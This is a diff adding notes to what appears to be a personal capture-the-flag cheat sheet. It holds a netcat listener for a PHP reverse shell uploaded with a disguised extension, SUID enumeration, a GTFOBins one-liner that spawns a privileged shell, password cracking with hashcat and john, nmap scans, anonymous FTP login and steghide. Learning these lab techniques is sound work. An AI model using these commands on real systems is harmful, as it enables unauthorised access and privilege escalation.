@@ -209,7 +209,75 @@ secnod: php_reverse_shell.jpg.php
 
 mv php_reverse_shell.php php_reverse_shell.phtml
 
+nc -lnvp [port_num]
 
+```
+
+how to search in all files
+```bash
+find / -type f -name [file_name]
+find / -type f -name flag.txt
+```
+
+
+SUID
+```
+find / -type f -user root -perm -4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+https://gtfobins.github.io/
+
+check what did you find in gtfobins
+
+always read the discripotion before lunch 
+
+example we found in gtfobins : python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
+
+
+```
+
+hashs handle with
+```bash
+echo 8743b52063cd84097a65d1633f5c74f5 >hash.txt
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec
+```
+
+nmap Scan
+
+```
+nmap -sC -sV -p- -oN nmap/allports <TARGET_IP>
+
+-sC : Default scripts
+-sV : Version detection
+-oN : Output to be stored in the directory ‘nmap’ you created earlier
+-p-: All ports to scan
+
+nmap -Pn <TARGET_IP>
+
+-Pn: No ping, only host discovery
+
+
+
+```
+ftp:
+
+```
+We will log into FTP as an ‘anonymous’ user with an ‘anonymous’ password.
+```
+
+steganography:
+
+```
+
+steghide extract -sf [file_name]
+
+```
+
+john
+```
+john [hash.txt] --format=[the_format] --wordlist=[pass]
 ```
 
 
